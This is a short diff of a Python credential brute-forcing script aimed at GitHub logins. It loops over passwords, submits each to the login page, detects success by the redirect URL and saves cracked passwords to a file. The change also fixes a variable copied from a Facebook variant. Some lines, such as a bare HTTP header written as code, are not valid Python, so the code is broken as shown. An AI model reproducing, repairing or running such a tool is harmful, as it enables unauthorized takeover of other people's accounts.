@@ -31,8 +31,7 @@ def github():
         print('\rPassword [==] {} '.format(password).rstrip("\n"))
         sys.stdout.flush
         url = "https://github.com/login"
-        sec-ch-ua-platform: "Windows"
-        sec-ch-ua-platform: "Android"
+        Sec-CH-UA-Platform: "Android"
 
         try:
             brows.open(url, timeout=5)
@@ -43,7 +42,7 @@ def github():
             submit = brows.submit()
             if 'https://github.com/?sk=welcome' in  submit.geturl():
                 print("{}[True][+] Password Found [{}][+]".format(G,password))
-                Save = io.open("github.txt","a").write("Account Facebook:"+options.facebook+"\t\tPassword:"+password+"\n")
+                Save = io.open("github.txt","a").write("Account Facebook:"+options.github+"\t\tPassword:"+password+"\n")
                 break
             else :
                 print("%s[!] False Login Password%s\n"%(R,W))
